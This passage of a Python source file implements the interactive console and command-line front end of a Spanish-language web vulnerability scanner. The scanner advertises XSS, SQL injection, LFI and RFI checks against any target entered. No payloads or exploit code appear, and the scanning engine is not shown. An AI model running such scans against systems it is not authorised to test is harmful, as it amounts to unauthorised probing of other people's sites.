║   {Fore.RED}█████{Fore.CYAN}╗ {Fore.RED}██████{Fore.CYAN}╗ {Fore.RED}██{Fore.CYAN}╗   {Fore.RED}██{Fore.CYAN}╗ {Fore.RED}█████{Fore.CYAN}╗ {Fore.RED}███{Fore.CYAN}╗   {Fore.RED}██{Fore.CYAN}╗ {Fore.RED}██████{Fore.CYAN}╗{Fore.RED}███████{Fore.CYAN}╗{Fore.RED}██████{Fore.CYAN}╗     ║
║  {Fore.RED}██{Fore.CYAN}╔══{Fore.RED}██{Fore.CYAN}╗{Fore.RED}██{Fore.CYAN}╔══{Fore.RED}██{Fore.CYAN}╗{Fore.RED}██{Fore.CYAN}║   {Fore.RED}██{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}╔══{Fore.RED}██{Fore.CYAN}╗{Fore.RED}████{Fore.CYAN}╗  {Fore.RED}██{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}╔════╝{Fore.RED}██{Fore.CYAN}╔════╝{Fore.RED}██{Fore.CYAN}╔══{Fore.RED}██{Fore.CYAN}╗    ║
║  {Fore.RED}███████{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}║  {Fore.RED}██{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}║   {Fore.RED}██{Fore.CYAN}║{Fore.RED}███████{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}╔{Fore.RED}██{Fore.CYAN}╗ {Fore.RED}██{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}║     {Fore.RED}█████{Fore.CYAN}╗  {Fore.RED}██{Fore.CYAN}║  {Fore.RED}██{Fore.CYAN}║    ║
║  {Fore.RED}██{Fore.CYAN}╔══{Fore.RED}██{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}║  {Fore.RED}██{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}║   {Fore.RED}██{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}╔══{Fore.RED}██{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}║╚{Fore.RED}██{Fore.CYAN}╗{Fore.RED}██{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}║     {Fore.RED}██{Fore.CYAN}╔══╝  {Fore.RED}██{Fore.CYAN}║  {Fore.RED}██{Fore.CYAN}║    ║
║  {Fore.RED}██{Fore.CYAN}║  {Fore.RED}██{Fore.CYAN}║{Fore.RED}██████{Fore.CYAN}╔╝╚{Fore.RED}██████{Fore.CYAN}╔╝{Fore.RED}██{Fore.CYAN}║  {Fore.RED}██{Fore.CYAN}║{Fore.RED}██{Fore.CYAN}║ ╚{Fore.RED}████{Fore.CYAN}║╚{Fore.RED}██████{Fore.CYAN}╗{Fore.RED}███████{Fore.CYAN}╗{Fore.RED}██████{Fore.CYAN}╔╝    ║
║  ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝╚═════╝     ║
║                                                                           ║
║      {Fore.YELLOW}ADVANCED WEB VULNERABILITY SCANNER v{VERSION}{Fore.CYAN}                      ║
║                                                                           ║
╠═══════════════════════════════════════════════════════════════════════════╣
║                                                                           ║
║  {Fore.GREEN}● Bienvenido al Web Vulnerability Scanner - Tu herramienta de seguridad{Fore.CYAN}  ║
║  {Fore.GREEN}● Descubre vulnerabilidades XSS, SQL Injection, LFI, RFI y mucho más{Fore.CYAN}    ║
║  {Fore.GREEN}● Escaneo configurable: ajusta profundidad, hilos y tipos de pruebas{Fore.CYAN}    ║
║                                                                           ║
╠═══════════════════════════════════════════════════════════════════════════╣
║  {Fore.WHITE}COMANDOS DISPONIBLES:{Fore.CYAN}                                                   ║
║                                                                           ║
║  {Fore.YELLOW}scan [target]{Fore.WHITE} - Iniciar un escaneo en el objetivo especificado{Fore.CYAN}          ║
║  {Fore.YELLOW}set <param> <valor>{Fore.WHITE} - Configurar parámetros del escáner{Fore.CYAN}                 ║
║  {Fore.YELLOW}show <config|vulns|urls>{Fore.WHITE} - Mostrar configuración o resultados{Fore.CYAN}           ║
║  {Fore.YELLOW}clear{Fore.WHITE} - Limpiar la pantalla{Fore.CYAN}                                             ║
║  {Fore.YELLOW}exit{Fore.WHITE} - Salir del programa{Fore.CYAN}                                               ║
║  {Fore.YELLOW}help{Fore.WHITE} - Mostrar ayuda detallada{Fore.CYAN}                                          ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝
{Fore.RESET}
'''
    prompt = f"{Fore.RED}┌──({Fore.CYAN}WebScan{Fore.RED}㉿{Fore.CYAN}SecTool{Fore.RED})-[{Fore.YELLOW}~{Fore.RED}]\n└─{Fore.GREEN}$ {Fore.RESET}"
    
    def __init__(self):
        # Configuración del historial si readline está disponible
        if 'readline' in sys.modules and sys.modules['readline'] is not None:
            try:
                # Intenta configurar la tecla de completado
                readline.parse_and_bind('tab: complete')
                
                # Intenta crear un archivo de historial
                history_file = os.path.expanduser('~/.webscan_history')
                try:
                    if not os.path.exists(history_file):
                        with open(history_file, 'w') as f:
                            pass
                    readline.read_history_file(history_file)
                except (IOError, PermissionError):
                    # Si hay un error al acceder al archivo, continuar sin historial
                    pass
                self.history_file = history_file
            except (AttributeError, ImportError):
                # Si readline no tiene estas funciones, ignorar
                self.history_file = None
        else:
            self.history_file = None
            
        super().__init__()
        self.scanner = None
        self.target = None
        self.config_file = None
        self.output_dir = None
        self.format = "all"
        self.threads = 5
        self.depth = 3
        self.verify_ssl = True
        self.timeout = 10
        self.verbose = False
        
        # Contador para animaciones
        self.status_animation_active = False
        self.animation_thread = None
    
    def cmdloop(self, intro=None):
        """Override cmdloop to handle readline compatibility issues."""
        self.preloop()
        if self.intro and intro is None:
            print(self.intro)
        if intro is not None:
            print(intro)
        stop = None
        while not stop:
            try:
                if self.cmdqueue:
                    line = self.cmdqueue.pop(0)
                else:
                    line = input(self.prompt)
                line = self.precmd(line)
                stop = self.onecmd(line)
                stop = self.postcmd(stop, line)
            except KeyboardInterrupt:
                print("^C")
            except EOFError:
                print()
                stop = True
        self.postloop()
    
    def _start_loading_animation(self, message="Procesando"):
        """Inicia una animación de carga en un hilo separado."""
        self.status_animation_active = True
        
        def animation():
            spinner = "|/-\\"
            i = 0
            while self.status_animation_active:
                i = (i + 1) % len(spinner)
                print(f"\r{Fore.CYAN}[{spinner[i]}] {message}...{Fore.RESET}", end="", flush=True)
                time.sleep(0.1)
            print("\r" + " " * (len(message) + 15) + "\r", end="", flush=True)
        
        self.animation_thread = threading.Thread(target=animation)
        self.animation_thread.daemon = True
        self.animation_thread.start()
    
    def _stop_loading_animation(self):
        """Detiene la animación de carga."""
        if self.status_animation_active:
            self.status_animation_active = False
            if self.animation_thread and self.animation_thread.is_alive():
                self.animation_thread.join(timeout=1.0)
    
    def do_scan(self, arg):
        """
        Iniciar un escaneo con la configuración actual.
        Uso: scan [target]
        Si se proporciona target, se usará ese objetivo. De lo contrario, se usará el objetivo configurado.
        """
        args = shlex.split(arg)
        target = args[0] if args else self.target
        
        if not target:
            self._display_error("Se requiere un objetivo (URL o dominio)")
            return
        
        # Mostrar banner de inicio de escaneo
        self._display_scan_banner(target)
        
        # Crear scanner
        self.scanner = VulnerabilityScanner(target, self.config_file)
        
        # Configurar opciones
        if self.output_dir:
            self.scanner.config.set(self.output_dir, "output", "directory")
        
        self.scanner.config.set(self.format, "output", "format")
        self.scanner.config.set(self.threads, "general", "threads")
        self.scanner.config.set(self.depth, "general", "max_depth")
        self.scanner.config.set(self.verify_ssl, "general", "verify_ssl")
        self.scanner.config.set(self.timeout, "general", "timeout")
        self.scanner.config.set(self.verbose, "general", "verbose")
        
        # Ejecutar escaneo
        try:
            self.scanner.scan()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Escaneo interrumpido por el usuario{Fore.RESET}")
            # Mostrar resumen parcial si hay datos disponibles
            if self.scanner and self.scanner.vulnerabilities:
                print(f"\n{Fore.CYAN}[i] Se encontraron {len(self.scanner.vulnerabilities)} vulnerabilidades antes de la interrupción{Fore.RESET}")
        except Exception as e:
            self._display_error(f"Error durante el escaneo: {str(e)}")
    
    def _display_scan_banner(self, target):
        """Muestra un banner atractivo para el inicio del escaneo."""
        print("\n" + "═" * 70)
        print(f"{Fore.CYAN}╔{'═' * 68}╗")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}INICIANDO ESCANEO DE VULNERABILIDADES{' ' * 36}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.GREEN}Target: {Fore.WHITE}{target}{' ' * (60 - len(target))}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.GREEN}Tiempo: {Fore.WHITE}{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{' ' * 40}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.GREEN}Hilos:  {Fore.WHITE}{self.threads}{' ' * 59}{Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.GREEN}Profundidad: {Fore.WHITE}{self.depth}{' ' * 53}{Fore.CYAN}║")
        print(f"{Fore.CYAN}╚{'═' * 68}╝")
        print(f"{Fore.YELLOW}[*] Preparando recursos para el escaneo...{Fore.RESET}")
        print("═" * 70 + "\n")
    
    def _display_error(self, message):
        """Muestra un mensaje de error formateado."""
        print(f"\n{Fore.RED}╔{'═' * (len(message) + 8)}╗")
        print(f"{Fore.RED}║  ⚠️  {message}  ║")
        print(f"{Fore.RED}╚{'═' * (len(message) + 8)}╝{Fore.RESET}\n")
    
    def _display_success(self, message):
        """Muestra un mensaje de éxito formateado."""
        print(f"\n{Fore.GREEN}╔{'═' * (len(message) + 8)}╗")
        print(f"{Fore.GREEN}║  ✅  {message}  ║")
        print(f"{Fore.GREEN}╚{'═' * (len(message) + 8)}╝{Fore.RESET}\n")
        
    def do_set(self, arg):
        """
        Establecer un parámetro de configuración.
        Uso: set <parámetro> <valor>
        
        Parámetros disponibles:
          target      URL o dominio objetivo
          config      Archivo de configuración
          output      Directorio de salida
          format      Formato de salida (json, html, csv, all)
          threads     Número de hilos
          depth       Profundidad máxima de crawling
          timeout     Timeout en segundos
          verify_ssl  Verificar certificados SSL (true/false)
          verbose     Modo verbose (true/false)
        """
        args = shlex.split(arg)
        if len(args) < 2:
            self._display_error("Se requiere un parámetro y un valor")
            return
        
        param, value = args[0].lower(), args[1]
        
        if param == "target":
            self.target = value
            self._display_success(f"Target establecido: {value}")
        
        elif param == "config":
            self.config_file = value
            self._display_success(f"Archivo de configuración establecido: {value}")
        
        elif param == "output":
            self.output_dir = value
            self._display_success(f"Directorio de salida establecido: {value}")
        
        elif param == "format":
            if value not in ["json", "html", "csv", "all"]:
                self._display_error("Formato inválido. Use json, html, csv o all")
                return
            self.format = value
            self._display_success(f"Formato establecido: {value}")
        
        elif param == "threads":
            try:
                self.threads = int(value)
                self._display_success(f"Número de hilos establecido: {value}")
            except ValueError:
                self._display_error("El número de hilos debe ser un entero")
        
        elif param == "depth":
            try:
                self.depth = int(value)
                self._display_success(f"Profundidad máxima establecida: {value}")
            except ValueError:
                self._display_error("La profundidad debe ser un entero")
        
        elif param == "timeout":
            try:
                self.timeout = int(value)
                self._display_success(f"Timeout establecido: {value} segundos")
            except ValueError:
                self._display_error("El timeout debe ser un entero")
        
        elif param == "verify_ssl":
            if value.lower() in ["true", "yes", "1"]:
                self.verify_ssl = True
                self._display_success("Verificación SSL activada")
            elif value.lower() in ["false", "no", "0"]:
                self.verify_ssl = False
                self._display_success("Verificación SSL desactivada")
            else:
                self._display_error("Valor inválido. Use true o false")
        
        elif param == "verbose":
            if value.lower() in ["true", "yes", "1"]:
                self.verbose = True
                self._display_success("Modo verbose activado")
            elif value.lower() in ["false", "no", "0"]:
                self.verbose = False
                self._display_success("Modo verbose desactivado")
            else:
                self._display_error("Valor inválido. Use true o false")
        
        else:
            self._display_error(f"Parámetro desconocido: {param}")
    
    def do_show(self, arg):
        """
        Muestra la configuración actual o resultados.
        Uso: show <config|vulns|urls>
        """
        arg = arg.strip().lower()
        
        if arg == "config" or arg == "":
            self._show_config()
        elif arg == "vulns":
            self._show_vulnerabilities()
        elif arg == "urls":
            self._show_urls()
        else:
            self._display_error(f"Opción desconocida: {arg}")
            print(f"{Fore.YELLOW}Opciones disponibles: config, vulns, urls{Fore.RESET}")
    
    def _show_config(self):
        """Muestra la configuración actual en una tabla formateada."""
        print(f"\n{Fore.CYAN}╔{'═' * 50}╗")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}CONFIGURACIÓN ACTUAL{' ' * 31}{Fore.CYAN}║")
        print(f"{Fore.CYAN}╠{'═' * 50}╣")
        
        config_items = [
            ("Target", self.target or 'No establecido'),
            ("Config File", self.config_file or 'Default'),
            ("Output Directory", self.output_dir or 'Default'),
            ("Format", self.format),
            ("Threads", str(self.threads)),
            ("Max Depth", str(self.depth)),
            ("Verify SSL", str(self.verify_ssl)),
            ("Timeout", f"{self.timeout} segundos"),
            ("Verbose", str(self.verbose))
        ]
        
        for item, value in config_items:
            padding = 50 - len(item) - len(value) - 4
            print(f"{Fore.CYAN}║ {Fore.GREEN}{item}: {Fore.WHITE}{value}{' ' * padding}{Fore.CYAN}║")
        
        print(f"{Fore.CYAN}╚{'═' * 50}╝{Fore.RESET}\n")
    
    def _show_vulnerabilities(self):
        """Muestra las vulnerabilidades encontradas en una tabla formateada."""
        if not self.scanner or not self.scanner.vulnerabilities:
            self._display_error("No hay resultados de vulnerabilidades disponibles")
            return
        
        vulns = self.scanner.vulnerabilities
        
        print(f"\n{Fore.CYAN}╔{'═' * 78}╗")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}VULNERABILIDADES ENCONTRADAS: {Fore.WHITE}{len(vulns)}{' ' * 43}{Fore.CYAN}║")
        print(f"{Fore.CYAN}╠{'═' * 78}╣")
        
        # Contar vulnerabilidades por severidad
        severities = {"Crítica": 0, "Alta": 0, "Media": 0, "Baja": 0}
        for vuln in vulns:
            severity = vuln.get('severity', 'Media')
            if severity in severities:
                severities[severity] += 1
        
        # Mostrar conteo por severidad
        for severity, count in severities.items():
            if count > 0:
                if severity == "Crítica":
                    color = Fore.RED + Style.BRIGHT
                elif severity == "Alta":
                    color = Fore.RED
                elif severity == "Media":
                    color = Fore.YELLOW
                else:
                    color = Fore.GREEN
                
                print(f"{Fore.CYAN}║ {color}{severity}: {count}{' ' * (70 - len(severity) - len(str(count)))}{Fore.CYAN}║")
        
        print(f"{Fore.CYAN}╠{'═' * 78}╣")
        
        # Mostrar vulnerabilidades
        for i, vuln in enumerate(vulns, 1):
            severity = vuln.get('severity', 'unknown')
            if severity.lower() == 'crítica':
                severity_color = Fore.RED + Style.BRIGHT
            elif severity.lower() == 'alta':
                severity_color = Fore.RED
            elif severity.lower() == 'media':
                severity_color = Fore.YELLOW
            else:
                severity_color = Fore.GREEN
            
            vuln_type = vuln.get('type', 'Unknown')
            print(f"{Fore.CYAN}║ {Fore.WHITE}#{i} {severity_color}[{severity.upper()}] {Fore.YELLOW}{vuln_type}{' ' * (73 - len(vuln_type) - len(severity) - 5)}{Fore.CYAN}║")
            
            url = vuln.get('url', vuln.get('form_action', 'N/A'))
            print(f"{Fore.CYAN}║ {Fore.GREEN}  URL: {Fore.WHITE}{url}{' ' * (73 - len(url) - 6)}{Fore.CYAN}║")
            
            if 'parameter' in vuln:
                param = vuln['parameter']
                print(f"{Fore.CYAN}║ {Fore.GREEN}  Parámetro: {Fore.WHITE}{param}{' ' * (73 - len(param) - 12)}{Fore.CYAN}║")
            
            if 'payload' in vuln and self.verbose:
                payload = vuln['payload']
                # Truncar payload si es muy largo
                if len(payload) > 55:
                    payload = payload[:52] + "..."
                print(f"{Fore.CYAN}║ {Fore.GREEN}  Payload: {Fore.WHITE}{payload}{' ' * (73 - len(payload) - 10)}{Fore.CYAN}║")
            
            print(f"{Fore.CYAN}╟{'─' * 78}╢")
        
        print(f"{Fore.CYAN}╚{'═' * 78}╝{Fore.RESET}\n")
    
    def _show_urls(self):
        """Muestra las URLs descubiertas en una tabla formateada."""
        if not self.scanner or not self.scanner.discovered_urls:
            self._display_error("No hay URLs descubiertas disponibles")
            return
        
        urls = list(self.scanner.discovered_urls)
        
        print(f"\n{Fore.CYAN}╔{'═' * 78}╗")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}URLS DESCUBIERTAS: {Fore.WHITE}{len(urls)}{' ' * 53}{Fore.CYAN}║")
        print(f"{Fore.CYAN}╠{'═' * 78}╣")
        
        for i, url in enumerate(urls, 1):
            # Truncar URL si es muy larga
            display_url = url
            if len(url) > 72:
                display_url = url[:69] + "..."
            
            print(f"{Fore.CYAN}║ {Fore.WHITE}{i:3d}. {Fore.GREEN}{display_url}{' ' * (72 - len(display_url) - 5)}{Fore.CYAN}║")
        
        print(f"{Fore.CYAN}╚{'═' * 78}╝{Fore.RESET}\n")
    
    def do_clear(self, arg):
        """Limpia la pantalla."""
        # Función multiplataforma para limpiar la pantalla
        os.system('cls' if os.name == 'nt' else 'clear')
        # Mostrar logo pequeño después de limpiar
        self._show_mini_logo()
    
    def _show_mini_logo(self):
        """Muestra un logo pequeño después de limpiar la pantalla."""
        print(f"""
{Fore.CYAN}╔{'═' * 50}╗
{Fore.CYAN}║ {Fore.RED}ADVANCED WEB VULNERABILITY SCANNER v{VERSION}{' ' * (21-len(VERSION))}{Fore.CYAN}║
{Fore.CYAN}╚{'═' * 50}╝{Fore.RESET}
""")
    
    def save_history(self):
        """Guarda el historial de comandos si readline está disponible."""
        if hasattr(self, 'history_file') and self.history_file:
            try:
                readline.write_history_file(self.history_file)
            except (AttributeError, IOError, PermissionError):
                # Si hay un error al escribir, ignorar
                pass
    
    def do_exit(self, arg):
        """Salir del programa."""
        print(f"""
{Fore.CYAN}╔{'═' * 50}╗
{Fore.CYAN}║ {Fore.YELLOW}¡Gracias por usar Web Vulnerability Scanner!{' ' * 5}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}Desarrollado para mejorar la seguridad web{' ' * 7}{Fore.CYAN}║
{Fore.CYAN}╚{'═' * 50}╝{Fore.RESET}
""")
        self.save_history()
        return True
    
    def do_quit(self, arg):
        """Salir del programa."""
        return self.do_exit(arg)
    
    def do_help(self, arg):
        """Muestra la ayuda para los comandos."""
        if arg:
            # Ayuda específica para un comando
            cmd.Cmd.do_help(self, arg)
        else:
            # Ayuda general mejorada
            self._show_help_menu()
    
    def _show_help_menu(self):
        """Muestra un menú de ayuda mejorado."""
        print(f"""
{Fore.CYAN}╔{'═' * 80}╗
{Fore.CYAN}║ {Fore.YELLOW}AYUDA DE COMANDOS - WEB VULNERABILITY SCANNER{' ' * 33}{Fore.CYAN} ║
{Fore.CYAN}╠{'═' * 80}╣
{Fore.CYAN}║ {Fore.GREEN}scan [target]{Fore.RESET}{' ' * 66}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  Inicia un escaneo de vulnerabilidades en el objetivo especificado.{' ' * 11}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  Si no se proporciona target, se usará el configurado con 'set target'.{' ' * 7}{Fore.CYAN}║
{Fore.CYAN}║ {' ' * 79}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}set <param> <valor>{Fore.RESET}{' ' * 59}{Fore.CYAN} ║
{Fore.CYAN}║ {Fore.WHITE}  Configura parámetros del escáner. Parámetros disponibles:{' ' * 20}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  - target: URL o dominio objetivo{' ' * 45}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  - config: Archivo de configuración{' ' * 43}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  - output: Directorio de salida para informes{' ' * 33}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  - format: Formato de salida (json, html, csv, all){' ' * 27}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  - threads: Número de hilos para escaneo paralelo{' ' * 28}{Fore.CYAN} ║
{Fore.CYAN}║ {Fore.WHITE}  - depth: Profundidad máxima de crawling{' ' * 37}{Fore.CYAN} ║
{Fore.CYAN}║ {Fore.WHITE}  - verify_ssl: Verificar certificados SSL (true/false){' ' * 24}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  - verbose: Activar/desactivar modo detallado (true/false){' ' * 20}{Fore.CYAN}║
{Fore.CYAN}║ {' ' * 79}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}show <opción>{Fore.RESET}{' ' * 66}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  Muestra información sobre la configuración o resultados del escaneo.{' ' * 9}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  Opciones disponibles:{' ' * 56}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  - config: Muestra la configuración actual del escáner{' ' * 24}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  - vulns: Muestra las vulnerabilidades encontradas{' ' * 28}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  - urls: Muestra las URLs descubiertas durante el escaneo{' ' * 21}{Fore.CYAN}║
{Fore.CYAN}║ {' ' * 79}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}clear{Fore.RESET}{' ' * 74}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  Limpia la pantalla de la consola.{' ' * 44}{Fore.CYAN}║
{Fore.CYAN}║ {' ' * 79}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}exit, quit{Fore.RESET}{' ' * 69}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  Cierra la aplicación.{' ' * 56}{Fore.CYAN}║
{Fore.CYAN}║ {' ' * 79}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}help [comando]{Fore.RESET}{' ' * 65}{Fore.CYAN}║
{Fore.CYAN}║ {Fore.WHITE}  Muestra esta ayuda o información detallada sobre un comando específico.{' ' * 6}{Fore.CYAN}║
{Fore.CYAN}╚{'═' * 80}╝{Fore.RESET}
""")
    
    
    def emptyline(self):
        """No hacer nada en línea vacía."""
        pass

    def default(self, line):
        """Maneja comandos desconocidos."""
        print(f"{Fore.RED}Comando desconocido: {line}{Fore.RESET}")
        print("Escribe 'help' para ver los comandos disponibles.")
        
    # Aliases para comandos comunes
    do_q = do_quit
    do_cls = do_clear
    
    def precmd(self, line):
        """Preprocesa cada línea antes de ejecutar el comando."""
        if line and not line.startswith("#"):
            print()  # Línea en blanco antes de cada ejecución de comando
        return line

    def postcmd(self, stop, line):
        """Postprocesa cada línea después de ejecutar el comando."""
        if line and not line.startswith("#"):
            print()  # Línea en blanco después de cada ejecución de comando
        return stop

def main():
    """Función principal del escáner."""
    parser = argparse.ArgumentParser(description=f'Advanced Web Vulnerability Scanner v{VERSION}')
    parser.add_argument('target', nargs='?', help='URL objetivo (ej: example.com)', default='')
    parser.add_argument('-c', '--config', help=f'Archivo de configuración (predeterminado: {DEFAULT_CONFIG_FILE})')
    parser.add_argument('-o', '--output', help='Directorio de salida para informes')
    parser.add_argument('-f', '--format', choices=['json', 'html', 'csv', 'all'], help='Formato de informe')
    parser.add_argument('-t', '--threads', type=int, help='Número de hilos')
    parser.add_argument('-d', '--depth', type=int, help='Profundidad máxima de crawling')
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verboso')
    parser.add_argument('--no-verify', action='store_true', help='No verificar certificados SSL')
    parser.add_argument('--timeout', type=int, help='Timeout en segundos para las solicitudes')
    parser.add_argument('--console', action='store_true', help='Iniciar en modo consola interactiva')
    
    args = parser.parse_args()
    
    # Verificar si se debe iniciar en modo consola
    if args.console or not args.target:
        # Modo consola interactiva
        console = VulnScannerConsole()
        
        # Si se pasaron argumentos, configurarlos
        if args.target:
            console.target = args.target
        if args.config:
            console.config_file = args.config
        if args.output:
            console.output_dir = args.output
        if args.format:
            console.format = args.format
        if args.threads:
            console.threads = args.threads
        if args.depth:
            console.depth = args.depth
        if args.timeout:
            console.timeout = args.timeout
        console.verify_ssl = not args.no_verify
        console.verbose = args.verbose
        
        try:
            console.cmdloop()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Programa interrumpido por el usuario.{Fore.RESET}")
            return 1
        return 0
    
    # Modo normal con argumentos de línea de comandos
    try:
        # Inicializar escáner
        scanner = VulnerabilityScanner(args.target, args.config)
        
        # Aplicar configuraciones de línea de comandos
        if args.output:
            scanner.config.set(args.output, "output", "directory")
        if args.format:
            scanner.config.set(args.format, "output", "format")
        if args.threads:
            scanner.config.set(args.threads, "general", "threads")
        if args.depth:
            scanner.config.set(args.depth, "general", "max_depth")
        if args.verbose:
            scanner.config.set(True, "general", "verbose")
        if args.no_verify:
            scanner.config.set(False, "general", "verify_ssl")
        if args.timeout:
            scanner.config.set(args.timeout, "general", "timeout")
        
        # Ejecutar escaneo
        scanner.scan()
        
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}[!] Escaneo interrumpido por el usuario")
        return 1
        
    except ConnectionError as e:
        print(f"{Fore.RED}[!] Error de conexión: no se pudo conectar con el objetivo {args.target}")
        print(f"{Fore.RED}    Detalles: {str(e)}")
        logger.error(f"Error de conexión con {args.target}: {str(e)}")
        return 2
        
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}[!] Error en solicitud HTTP: {str(e)}")
        logger.error(f"Error en solicitud HTTP: {str(e)}")
        return 3
        
    except Exception as e:
        print(f"{Fore.RED}[!] Error durante el escaneo: {str(e)}")
        logger.error(f"Error en el escaneo: {str(e)}")
        
        # Mostrar el traceback completo solo en modo verboso
        if args and args.verbose:
            import traceback
            traceback.print_exc()
        
        return 4
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
